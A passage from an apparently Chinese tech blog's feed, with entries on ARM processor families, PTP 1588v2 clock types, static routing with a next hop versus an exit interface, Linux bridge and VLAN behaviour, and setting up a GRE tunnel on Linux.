</span><span style="font-family:宋体">应用案例：高通</span><span style="font-family:Verdana">MSM7225</span><span style="font-family:宋体">（</span><span style="font-family:Verdana">HTC G8</span><span style="font-family:宋体">）、</span><span style="font-family:Verdana">MSM7227</span><span style="font-family:宋体">（</span><span style="font-family:Verdana">HTC G6</span><span style="font-family:宋体">、三星</span><span style="font-family:Verdana">S5830</span><span style="font-family:宋体">、索尼爱立信</span><span style="font-family:Verdana">X8</span><span style="font-family:宋体">等）、</span><span style="font-family:Verdana">Tegra APX 2500</span><span style="font-family:宋体">、博通</span><span style="font-family:Verdana">BCM2727</span><span style="font-family:宋体">（诺基亚</span><span style="font-family:Verdana">N8</span><span style="font-family:宋体">）、博通</span><span style="font-family:Verdana">BCM2763</span><span style="font-family:宋体">（诺基亚</span><span style="font-family:Verdana">PureView 808</span><span style="font-family:宋体">）、</span><span style="font-family:Verdana"> Telechip 8902</span><span style="font-family:宋体">（平板电脑）。</span><span style="font-family:Verdana"><br>            </span></span></p><p><span style="color:black; font-size:9pt"><strong><span style="font-family:Verdana">● ARM9</span><span style="font-family:宋体">系列和</span><span style="font-family:Verdana">ARM7</span><span style="font-family:宋体">系列处理器架构解析</span><span style="font-family:Verdana"><br>                </span></strong></span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"> ARM9</span><span style="font-family:宋体">系列处理器系列包括</span><span style="font-family:Verdana">ARM926EJ-S</span><span style="font-family:宋体">、</span><span style="font-family:Verdana">ARM946E-S</span><span style="font-family:宋体">和</span><span style="font-family:Verdana"> ARM968E-S</span><span style="font-family:宋体">处理器。其中前两者主要针对嵌入式实时应用，我们这里就主要针对</span><span style="font-family:Verdana">ARM926EJ-S</span><span style="font-family:宋体">进行介绍。</span><span style="font-family:Verdana"><br>            </span></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM725.jpg" alt=""><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"> ARM926EJ-S</span><span style="font-family:宋体">基于</span><span style="font-family:Verdana">ARMv5TE</span><span style="font-family:宋体">架构，作为入门级处理器，它支持各种操作系统，如</span><span style="font-family:Verdana">Linux</span><span style="font-family:宋体">、</span><span style="font-family:Verdana">Windows CE</span><span style="font-family:宋体">和</span><span style="font-family:Verdana">Symbian</span><span style="font-family:宋体">。</span><span style="font-family:Verdana">ARM926EJ-S </span><span style="font-family:宋体">处理器已授权于全球</span><span style="font-family:Verdana">100</span><span style="font-family:宋体">多家硅片供应商，并不断在众多产品和应用中得到成功部署，应用广泛。</span><span style="font-family:Verdana"><br>            </span></span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"> </span><span style="font-family:宋体">应用案例：</span><span style="font-family:Verdana">TI OMAP 1710</span><span style="font-family:宋体">。诺基亚</span><span style="font-family:Verdana">N73</span><span style="font-family:宋体">、诺基亚</span><span style="font-family:Verdana">E65</span><span style="font-family:宋体">、三星</span><span style="font-family:Verdana">SGH-i600</span><span style="font-family:宋体">等手机采用的都是该处理器，以及包括米尔科技的</span><span style="font-family:Verdana"> <a href="http://www.myir-tech.com/product/myd-sam9x5.htm" target="_blank" rel="external"><span style="color:#0f758e; text-decoration:underline">MYS-SAM9X5</span></a> </span><span style="font-family:宋体">系列工控开发板。</span><span style="font-family:Verdana"><br>            </span></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM726.jpg" alt=""><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><a href="http://www.myir-tech.com/product/myd-sam9x5.htm" target="_blank" rel="external"><span style="color:#0f758e; font-size:9pt; text-decoration:underline"><span style="font-family:Verdana">ARM9 </span><span style="font-family:宋体">开发板</span></span></a><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><strong><span style="font-family:Verdana">● ARM7</span><span style="font-family:宋体">系列处理器</span><span style="font-family:Verdana"><br>                </span></strong></span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"> ARM7</span><span style="font-family:宋体">系列处理器系列包括</span><span style="font-family:Verdana">ARM7TDMI-S</span><span style="font-family:宋体">（</span><span style="font-family:Verdana">ARMv4T</span><span style="font-family:宋体">架构）和</span><span style="font-family:Verdana">ARM7EJ-S</span><span style="font-family:宋体">（</span><span style="font-family:Verdana">ARMv5TEJ</span><span style="font-family:宋体">架构），最早在</span><span style="font-family:Verdana">1994</span><span style="font-family:宋体">推出，相对上面产品来说已经显旧。虽然现在</span><span style="font-family:Verdana">ARM7</span><span style="font-family:宋体">处理器系列仍用于某些简单的</span><span style="font-family:Verdana">32</span><span style="font-family:宋体">位设备，但是更新的嵌入式设计正在越来越多地使用最新的</span><span style="font-family:Verdana">ARM</span><span style="font-family:宋体">处理器，这些处理器在技术上比</span><span style="font-family:Verdana">ARM 7</span><span style="font-family:宋体">系列有了显著改进。</span><span style="font-family:Verdana"><br>            </span></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/07/071316_0234_ARMARM727.jpg" alt=""><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:宋体">　　</span><span style="font-family:Verdana"><br>            </span><span style="font-family:宋体">作为目前较旧的一个系列，</span><span style="font-family:Verdana">ARM7</span><span style="font-family:宋体">处理器已经不建议继续在新品中使用。它究竟有多老呢？上面的</span><span style="font-family:Verdana">Apple eMate 300</span><span style="font-family:宋体">使用的就是一款</span><span style="font-family:Verdana">25MHz</span><span style="font-family:宋体">的</span><span style="font-family:Verdana">ARM7</span><span style="font-family:宋体">处理器，够古老了吧？</span><span style="font-family:Verdana"><br>            </span></span></p><p><span style="color:black; font-size:9pt"><strong><span style="font-family:Verdana">● </span><span style="font-family:宋体">相关文章</span><span style="font-family:Verdana"><br>                </span></strong></span></p><p><a href="http://www.myir-tech.com/resource/449.asp" target="_blank" rel="external"><span style="color:#0f758e; font-size:9pt; text-decoration:underline"><span style="font-family:Verdana">ARM</span><span style="font-family:宋体">最新开发工具</span><span style="font-family:Verdana">DS-5</span><span style="font-family:宋体">到底是什么？有什么用？</span></span></a><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><a href="http://www.myir-tech.com/resource/436.asp" target="_blank" rel="external"><span style="color:#0f758e; font-size:9pt; text-decoration:underline"><span style="font-family:Verdana">ARM</span><span style="font-family:宋体">处理器体系架构详细说明</span></span></a><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><a href="http://www.myir-tech.com/resource/493.asp" target="_blank" rel="external"><span style="color:#0f758e; font-size:9pt; text-decoration:underline"><span style="font-family:Verdana">ARM </span><span style="font-family:宋体">开发工具</span><span style="font-family:Verdana"> DS-5 RVDS MDK-ARM </span><span style="font-family:宋体">比较区别和选择</span></span></a><span style="color:black; font-family:Verdana; font-size:9pt"><br>        </span></p><p><span style="color:black; font-size:9pt"><span style="font-family:Verdana"><br></span><span style="font-family:宋体">本文来自<a href="http://www.myir-tech.com/" target="_blank" rel="external"><span style="color:#0f758e; text-decoration:underline">米尔</span></a>科技，原文地址：</span><span style="font-family:Verdana"> <a href="http://www.myir-tech.com/resource/448.asp" target="_blank" rel="external"><span style="color:#0f758e; text-decoration:underline">http://www.myir-tech.com/resource/448.asp</span></a></span><span style="font-family:宋体">，转载请注明出处。</span><span style="font-family:Verdana"><br>            </span></span></p>]]></content>
    
    <summary type="html">
    
      前不久ARM正式宣布推出新款ARMv8架构的Cortex-A50处理器系列产品，以此来扩大ARM在高性能与低功耗领域的领先地位，进一步抢占移动终端市场份额。Cortex-A50是继Cortex-A15之后的又一重量级产品，将会直接影响到主流PC市场的占有率
    
    </summary>
    
      <category term="EMBEDDED" scheme="http://demonelf.github.io/categories/EMBEDDED/"/>
    
    
  </entry>
  
  <entry>
    <title>1588v2（PTP）协议实体类型详解</title>
    <link href="http://demonelf.github.io/EMBEDDED/1588v2%EF%BC%88PTP%EF%BC%89%E5%8D%8F%E8%AE%AE%E5%AE%9E%E4%BD%93%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3.html"/>
    <id>http://demonelf.github.io/EMBEDDED/1588v2（PTP）协议实体类型详解.html</id>
    <published>2019-08-29T04:18:26.837Z</published>
    <updated>2019-08-29T04:16:22.525Z</updated>
    
    <content type="html"><![CDATA[<p><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">PTP共有5种实体类型：</span><span style="color:black; font-size:10pt"><br>            </span></span></p><a id="more"></a><ul><li><div style="background: white"><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">普通时钟（Ordinaryclock），</span><span style="color:black; font-size:10pt"><br>                </span></span></div></li><li><div style="background: white"><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">边界时钟（Boundaryclock），</span><span style="color:black; font-size:10pt"><br>                </span></span></div></li><li><div style="background: white"><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">E2E透传时钟（End-to-end transparent clock），</span><span style="color:black; font-size:10pt"><br>                </span></span></div></li><li><div style="background: white"><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">P2P透传时钟（Peer-to-peer transparent clock），</span><span style="color:black; font-size:10pt"><br>                </span></span></div></li><li><div style="background: white"><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">管理节点。</span><span style="color:black; font-size:10pt"><br>                </span></span></div></li></ul><p><span style="color:#17365d; font-family:宋体"><span style="font-size:15pt"><strong>普通时钟</strong></span><span style="color:black; font-size:10pt"><br>                    </span></span></p><p><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">普通时钟只有一个PTP物理通信端口和网络相连，一个物理端口包括2个逻辑接口，事件接口（event interface）和通用接口（general interface）。事件接口接收和发送需要打时间标签的事件消息。通用接口接收和发送其他消息。一个普通时钟只有一个PTP协议处理器。在网络中，普通时钟可以作为祖父时钟（grandmaster clock）或从时钟（slave clock）。当作为祖父时钟是，其PTP端口处于主状态（master），作为从时钟时其PTP端口处于从状态（slave），普通时钟的框图如下：</span><span style="color:black; font-size:10pt"><br>                    </span></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/05/051716_0835_1588v2PTP1.png" alt=""><span style="color:black; font-family:宋体; font-size:10pt"><br>                </span></p><p><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">框图中的协议引擎主要完成：</span><span style="color:black; font-size:10pt"><br>                    </span></span></p><ul><li><div style="background: white"><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">发送和接收协议消息。</span><span style="color:black; font-size:10pt"><br>                </span></span></div></li><li><div style="background: white"><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">维护时钟和端口数据</span><span style="color:black; font-size:10pt"><br>                </span></span></div></li><li><div style="background: white"><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">执行PTP状态机的处理功能。</span><span style="color:black; font-size:10pt"><br>                </span></span></div></li><li><div style="background: white"><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">如果普通时钟是作为从时钟，则根据PTP协议计算父时钟的时间。</span><span style="color:black; font-size:10pt"><br>                </span></span></div><p><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">一个普通时钟维护两套数据：时钟相关的数据和端口相关的数据，时钟相关的数据有：</span><span style="color:black; font-size:10pt"></span></span></p><pre><code>&lt;/span&gt;&lt;/span&gt;</code></pre></li><li><div style="background: white"><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">Default数据：用于描述普通时钟的属性。</span><span style="color:black; font-size:10pt"><br>                </span></span></div></li><li><div style="background: white"><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">Current数据：用于描述同步相关的属性。</span><span style="color:black; font-size:10pt"><br>                </span></span></div></li><li><div style="background: white"><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">父时钟和祖父时钟数据：用于描述父时钟和祖父时钟的属性。</span><span style="color:black; font-size:10pt"><br>                </span></span></div></li><li><div style="background: white"><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">时间特性：用于描述时标的属性。</span><span style="color:black; font-size:10pt"><br>                </span></span></div><p><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">端口相关的数据包括端口的属性以及PTP状态的数据。</span><span style="color:black; font-size:10pt"></span></span></p><pre><code>&lt;/span&gt;&lt;/span&gt;</code></pre></li></ul><p><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">当普通时钟的端口是从状态时，时钟控制环路用来控制本地时钟和父时钟同步。当普通时钟作为祖父时钟时，本地时钟要么自由振荡要么同步于外部的时钟源（如GPS等）。</span><span style="color:black; font-size:10pt"><br>                    </span></span></p><p><span style="color:#17365d; font-family:宋体"><span style="font-size:15pt"><strong>边界时钟</strong></span><span style="color:black; font-size:10pt"><br>                    </span></span></p><p><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">边界时钟有多个PTP物理通信端口和网络相连，每个物理端口包括2个逻辑接口，事件接口和通用接口。边界时钟的每个PTP端口和普通时钟的PTP端口一样，除了以下几点：</span><span style="color:black; font-size:10pt"><br>                    </span></span></p><ul><li><div style="background: white"><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">边界时钟的所有端口共同使用一套时钟数据。</span><span style="color:black; font-size:10pt"><br>                </span></span></div></li><li><div style="background: white"><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">边界时钟的所有端口共同使用一个本地时钟。</span><span style="color:black; font-size:10pt"><br>                </span></span></div></li><li><div style="background: white"><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">每个端口的协议引擎增加一个功能：从所有端口中选择一个端口作为本地时钟的同步输入。</span><span style="color:black; font-size:10pt"><br>                </span></span></div><p><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">协议引擎将总结和同步相关（包括建立时钟同步层次）的消息和信令。但可以转发管理消息。边界时钟的框图如下：</span><span style="color:black; font-size:10pt"></span></span></p><pre><code>&lt;/span&gt;&lt;/span&gt;</code></pre></li></ul><p><img src="http://www.madhex.com/wp-content/uploads/2016/05/051716_0835_1588v2PTP2.png" alt=""><span style="color:black; font-family:宋体; font-size:10pt"><br>                </span></p><p><span style="color:#17365d; font-family:宋体"><span style="font-size:15pt"><strong>E2E透传时钟</strong></span><span style="color:black; font-size:10pt"><br>                    </span></span></p><p><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">E2E透传时钟像路由器或交换机一样转发所有的PTP消息，但对于事件消息，有一个停留时间桥计算该消息报文在本点停留的时间（消息报文穿过本点所花的时间），停留时间将累加到消息报文中的”修正”（correction field）字段中。修正过程如下图：</span><span style="color:black; font-size:10pt"><br>                    </span></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/05/051716_0835_1588v2PTP3.png" alt=""><span style="color:black; font-family:宋体; font-size:10pt"><br>                </span></p><p><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">E2E透传时钟的框图如下：</span><span style="color:black; font-size:10pt"><br>                    </span></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/05/051716_0835_1588v2PTP4.png" alt=""><span style="color:black; font-family:宋体; font-size:10pt"><br>                </span></p><p><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">用于计算停留时间的时间戳是由本地时钟产生的，所以本地时钟和时间源的时钟之间的频率差会造成误差。最好是本地时钟去锁定时钟源时钟。如果本地时钟锁定的不是时间源时钟则要求其精度能到达一定标准,以本地时钟是三级钟为例，1ms的停留时间大约造成5ns的误差。</span><span style="color:black; font-size:10pt"><br>                    </span></span></p><p><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">E2E透传时钟可以和普通时钟合在一起作为一个网络单元，其框图如下：</span><span style="color:black; font-size:10pt"><br>                    </span></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/05/051716_0835_1588v2PTP5.png" alt=""><span style="color:black; font-family:宋体; font-size:10pt"><br>                </span></p><p><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">在上图中，如果普通时钟是从时钟，停留时间桥将接收到的时间消息，宣称消息，由输入的时钟同步消息产生的时间戳以及内部的停留时间传送给协议引擎，协议信息根据这些信息计算出正确的时间并以此控制本地时钟。如果普通时钟是主时钟，协议引擎将产生Sync和Followup消息，消息中发送时间戳由本地时钟基于内部停留时间和输出时间戳产生（it would originate Sync and Follow_Up messages with the sendingtimestamps referenced to the local clock of the ordinary clock and based oninternal timing corrections and the egress timestamp.）在实现中，透传时钟和普通时钟使用同一个本地时钟。</span><span style="color:black; font-size:10pt"><br>                    </span></span></p><p><span style="color:#17365d; font-family:宋体"><span style="font-size:15pt"><strong>P2P透传时钟</strong></span><span style="color:black; font-size:10pt"><br>                    </span></span></p><p><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">P2P透传时钟和E2E透传时钟只是对PTP时间消息的修正和处理方法不同，在其他方面是完全一样的。P2P透传时钟可以和E2E透传时钟一样与普通时钟合在一起作为一个网络单元。</span><span style="color:black; font-size:10pt"><br>                    </span></span></p><p><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">P2P透传时钟的框图如下：</span><span style="color:black; font-size:10pt"><br>                    </span></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/05/051716_0835_1588v2PTP6.png" alt=""><span style="color:black; font-family:宋体; font-size:10pt"><br>                </span></p><p><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">P2P透传时钟对每个端口有一个模块用来测量该端口和对端端口的link延时，对端端口也必须支持P2P模式。link的延时通过交换Pdelay_Req, Pdelay_Resp以及可能的Pdelay_Resp_Follow_Up消息测量出。P2P透传时钟仅仅修正和转发Sync和Followup消息。本地的停留时间和收到消息的端口的link延时均记入修正。修正过程如下图：</span><span style="color:black; font-size:10pt"><br>                    </span></span></p><p><img src="http://www.madhex.com/wp-content/uploads/2016/05/051716_0835_1588v2PTP7.png" alt=""><span style="color:black; font-family:宋体; font-size:10pt"><br>                </span></p><p><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">因为P2P的修正包括了link延时和停留时间，其修正域反映了整个路径的延时，从时钟可以根据Sync消息计算出正确的时间，而不需要再发Delay测量消息。再发生时钟路径倒换的时候，P2P方式基本不受影响，而E2E方式则需要在进行过新的延时测量之后，才能计算出正确的时间。</span><span style="color:black; font-size:10pt"><br>                    </span></span></p><p><span style="color:#17365d; font-family:宋体"><span style="font-size:15pt"><strong>管理节点</strong></span><span style="color:black; font-size:10pt"><br>                    </span></span></p><p><span style="color:#17365d; font-family:宋体"><span style="font-size:13pt">管理节点向人或程序提供PTP管理消息的接口，管理节点可以和任意时钟合在一起。</span><span style="color:black; font-size:10pt"><br>                    </span></span></p>]]></content>
    
    <summary type="html">
    
      PTP共有5种实体类型： * 普通时钟（Ordinaryclock）， * 边界时钟（Boundaryclock）， * E2E透传时钟（End-to-end
transparent clock）， * P2P透传时钟（
    
    </summary>
    
      <category term="EMBEDDED" scheme="http://demonelf.github.io/categories/EMBEDDED/"/>
    
    
  </entry>
  
  <entry>
    <title>静态路由使用下一跳IP与出接口的区别</title>
    <link href="http://demonelf.github.io/NETWORK/%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1%E4%BD%BF%E7%94%A8%E4%B8%8B%E4%B8%80%E8%B7%B3IP%E4%B8%8E%E5%87%BA%E6%8E%A5%E5%8F%A3%E7%9A%84%E5%8C%BA%E5%88%AB.html"/>
    <id>http://demonelf.github.io/NETWORK/静态路由使用下一跳IP与出接口的区别.html</id>
    <published>2019-08-29T04:16:16.229Z</published>
    <updated>2019-08-29T04:14:32.870Z</updated>
    
    <content type="html"><![CDATA[<p>配置下一跳为出接口的</p><p>好处是不用知道下一跳具体ip可以实现动态学习的效果</p><p>缺点在于下一跳路由器必须支持这种基本的arp代理功能.</p><p>拓扑图： <a href="http://img1.51cto.com/attachment/201308/210834964.png" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201308/210834964.png" alt=""></a><br>以太网链路中：两个接口之间的通信是靠MAC地址，根据MAC地址，将数据封装成数据帧后传送到网络，进而通过物理线路传送给对方。而获取到对端的MAC地址，是通过ARP来完成的。<br>例：1，当静态路由中下一跳使用出接口时，路由器会认为目标网络和接口处在“直连网络”中。如：R1(config)#ip route 192.168.2.0 255.255.255.0f0/0查看路由表：R1#show ip route  <a href="http://img1.51cto.com/attachment/201308/210834122.png" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201308/210834122.png" alt=""></a><br>在以太网直连网络中设备间的通信是靠ARP广播来获取到目标主机的MAC地址。即当R1要访问192.168.2.2这个ip地址时，R1会认为目标网络是和自己直连的（虽然这时候实际是静态路由），于是R1就要在F0/0口向网络发出ARP请求广播，来寻找192.168.2.2所对应的MAC地址。<br>这时，如果R2启用了ARP代理，那么R2将代替R3应答此ARP请求，即R2告诉R1：192.168.2.2所对应的MAC地址是R2的F0/0接口的MAC。如果R2的ARP代理功能关闭，那么R1将不能ping通192.168.2.2<br>使用出接口的弊端：如果R3后面接了些pc机，当R1要访问这些pc机时，都会产生一条该pc机和MAC地址对应的ARP条目缓存，如果pc机的数量很大，此缓存也会很大，会导致R1耗费很大内存来维护。<br>2，当静态路由中下一跳使用ip地址时，路由表中显示的是下一跳地址。如：R1(config)#ip route 192.168.2.0 255.255.255.0 192.168.1.2查看路由表：R1#show ip route  <a href="http://img1.51cto.com/attachment/201308/210835833.png" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201308/210835833.png" alt=""></a><br>这时去往192.168.2.2的网段只会维护一条ARP缓存，即192.168.1.2所对一个的是R2的F0/0接口地址。即使R3后面接了多台主机，也只需要维护这么一条ARP缓存记录。<br>二：点到点网络环境下：无论是指定下一跳地址还是出接口，都是一样的。因为这种环境下使用HDLC和PPP等协议来进行二层封装，不需要进行ARP的解析。<br>结论：1、在点到点网络环境下，无论是指定下一跳地址还是出接口，都是一样的2、在广播网络环境下，则不然。如果指定为出接口的话，那么不管数据包的目标地址是否有效，每次当数据包到达时都会触发一个ARP请求，又因为ARP代理功能在IOS环境下默认是打开的，这就意味着路由器需要配置大量的ARP高速缓存。而如果是指定为下一跳地址的话，仅当第一个去往目标网络的数据包到达时，才会触发ARP请求。<br>本文出自 “天好” 博客，请务必保留此出处<a href="http://tianhaoblog.blog.51cto.com/6467511/1280163" target="_blank" rel="external">http://tianhaoblog.blog.51cto.com/6467511/1280163</a></p>]]></content>
    
    <summary type="html">
    
      配置下一跳为出接口的 好处是不用知道下一跳具体ip可以实现动态学习的效果 缺点在于下一跳路由器必须支持这种基本的arp代理功能. 拓扑图：
以太网链路中：两个接口之间的通信是靠MAC地址，根据MAC地址，将数据封装成数据帧后传送到网络，进而通过物理
    
    </summary>
    
      <category term="NETWORK" scheme="http://demonelf.github.io/categories/NETWORK/"/>
    
    
  </entry>
  
  <entry>
    <title>关于linux 802</title>
    <link href="http://demonelf.github.io/NETWORK/%E5%85%B3%E4%BA%8Elinux%20802.1d%20(bridge)%20%E5%92%8C%20802.1q(vlan)%20%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%86%8D%E6%80%9D%E8%80%83.html"/>
    <id>http://demonelf.github.io/NETWORK/关于linux 802.1d (bridge) 和 802.1q(vlan) 实现的再思考.html</id>
    <published>2019-08-29T04:16:16.229Z</published>
    <updated>2019-08-29T04:14:25.606Z</updated>
    
    <content type="html"><![CDATA[<p>​    linux bridge - (brctl)实现了ieee 802.1d协议，这个实现，应该是不能支持VLAN的功能。也就是说，这个实现，只能承载一个广播域，而不能承载多个广播域。当然，可以创建多个bridge device，每个bridge都对应不同的vlan，在bridge内部，包通过fdb表来转发，但是这个fdb表里面并没有vlan的信息。如果要在多个bridge device之间通信，比必须在bridge device上创建vlan interface，然后配置路由，这样可以实现不同bridge之间的转发。<br>​    linux vlan - (vconfig)实现了ieee 802.1q协议。802.1q本来应该是一个二层协议，但是linux的实现需要创建vlan interface,而且可以在vlan interface上配置ip地址。所以，这个interface可以放到路由表里面。一般来说，在这个interface上收到的包，会带这个interface配置的vlan id，而从这个interface发出去的包，会打上这个interface的vlan id.</p><p>​    举一个例子。一个盒子有6个物理interface, eth0,eth1,eth2,eth3,eth4,eth5,eth6.<br>​    bridge0 { eth0, eth1, eth2 }, vlan id 是2<br>​    bridge1 { eth3, eth4, eth5 }, vlan id 是3<br>​    eth0,eth1,eth2,eth3,eth4,eth5都在混杂模式，并且没有ip地址，它们是bridge的port.<br>​    创建vlan interface, bridge0.2, bridge1.3。在bridge0.2和bridge1.3上配置ip地址。vlan 2的机器，把bridge0.2的地址设置为缺省网关；vlan 3的机器，把bridge1.3设置为缺省网关。当有包要从vlan 2发往vlan 3是，它将送到bridge0.2，然后，通过路由，找到bridge1.3，然后由bridge1.3发出去。这个过程中，packet里面的vlan id会发生改变。<br>​    这个例子里面，要求从bridge port上收到的包都必须是打tag的，在bridge里面，并不能识别和处理tag，只有到三层的vlan interface才能识别并处理这些tag.<br>在bridge是还会运行STP协议来消除回环，进而实现了link一级的HA。STP，RSTP都是没有vlan的概念，而后来的PVST,PVST+，以及MSTP等，都能识别vlan，并且能消除一个vlan里面的回环。</p><p>关于Bridge，可以参考：<a href="http://www.linuxfoundation.org/en/Net:Bridge" target="_blank" rel="external">http://www.linuxfoundation.org/en/Net:Bridge</a><br>关于Vlan,可以参考：<a href="http://www.candelatech.com/~greear/vlan.html" target="_blank" rel="external">http://www.candelatech.com/~greear/vlan.html</a><br>关于STP，可以参考：<a href="http://en.wikipedia.org/wiki/Spanning_tree_protocol" target="_blank" rel="external">http://en.wikipedia.org/wiki/Spanning_tree_protocol</a></p><p>posted on 2011-03-23 18:04 flyonok</p>]]></content>
    
    <summary type="html">
    
      ​ linux bridge - (brctl)实现了ieee
802.1d协议，这个实现，应该是不能支持VLAN的功能。也就是说，这个实现，只能承载一个广播域，而不能承载多个广播域。当然，可以创建多个bridge
device，每个bridge都对应不同
    
    </summary>
    
      <category term="NETWORK" scheme="http://demonelf.github.io/categories/NETWORK/"/>
    
    
  </entry>
  
  <entry>
    <title>三层交换机路由设计方案</title>
    <link href="http://demonelf.github.io/NETWORK/%E4%B8%89%E5%B1%82%E4%BA%A4%E6%8D%A2%E6%9C%BA%E8%B7%AF%E7%94%B1%E8%AE%BE%E8%AE%A1%E6%96%B9%E6%A1%88.html"/>
    <id>http://demonelf.github.io/NETWORK/三层交换机路由设计方案.html</id>
    <published>2019-08-29T04:16:16.198Z</published>
    <updated>2019-08-29T04:14:06.065Z</updated>
    
    <content type="html"><![CDATA[<iframe src="http://docs.google.com/viewer?url=http://www.madhex.com/NETWORK/三层交换机路由设计方案.doc&embedded=true" width="100%" height="480" scrolling="no" style="border: none;"></iframe>]]></content>
    
    <summary type="html">
    
      
      
        &lt;iframe src=&quot;http://docs.google.com/viewer?url=http://www.madhex.com/NETWORK/三层交换机路由设计方案.doc&amp;embedded=true&quot; width=&quot;100%&quot; height=&quot;480&quot; scroll
      
    
    </summary>
    
      <category term="NETWORK" scheme="http://demonelf.github.io/categories/NETWORK/"/>
    
    
  </entry>
  
  <entry>
    <title>linux 下创建GRE隧道</title>
    <link href="http://demonelf.github.io/NETWORK/linux%20%E4%B8%8B%E5%88%9B%E5%BB%BAGRE%E9%9A%A7%E9%81%93.html"/>
    <id>http://demonelf.github.io/NETWORK/linux 下创建GRE隧道.html</id>
    <published>2019-08-29T04:16:16.198Z</published>
    <updated>2019-08-29T04:13:44.705Z</updated>
    
    <content type="html"><![CDATA[<p>其他国家的互联网如同一个孤岛。要想访问国外网站异常的缓慢，甚至被和谐了。可以建立一条隧道来避免这种情况，下面说说GRE隧道如何建立。</p><ol><li>GRE介绍<br>GRE隧道是一种IP-over-IP的隧道，是通用路由封装协议，可以对某些网路层协议的数据报进行封装，使这些被封装的数据报能够在IPv4/IPv6 网络中传输。<br>Tunnel 是一个虚拟的点对点的连接，提供了一条通路使封装的数据报文能够在这个通路上传输，并且在一个Tunnel 的两端分别对数据报进行封装及解封装。　一个X协议的报文要想穿越IP网络在Tunnel中传输，必须要经过加封装与解封装两个过程。<br>要在Linux上创建GRE隧道，需要ip_gre内核模块，它是GRE通过IPv4隧道的驱动程序。</li><li><p>查看是否有加载ip_gre模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># modprobe ip_gre</div><div class="line"># lsmod | grep gre</div><div class="line">ip_gre                 22432  0</div><div class="line">gre                    12989  1 ip_gre</div><div class="line"># modprobe ip_gre</div><div class="line"># lsmod | grep gre</div><div class="line">ip_gre                 22432  0</div><div class="line">gre                    12989  1 ip_gre</div></pre></td></tr></table></figure></li><li><p>创建步骤<br>环境如下：<br>host A :  121.207.22.123<br>host B: 111.2.33.28<br>在host A上面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># ip tunnel add gre1 mode gre remote 111.2.33.28 local 121.207.22.123 ttl 255</div><div class="line"># ip link set gre1 up</div><div class="line"># ip addr add 10.10.10.1 peer 10.10.10.2 dev gre1</div><div class="line"># ip tunnel add gre1 mode gre remote 111.2.33.28 local 121.207.22.123 ttl 255</div><div class="line"># ip link set gre1 up</div><div class="line"># ip addr add 10.10.10.1 peer 10.10.10.2 dev gre1</div></pre></td></tr></table></figure></li></ol><p>创建一个GRE类型隧道设备gre0, 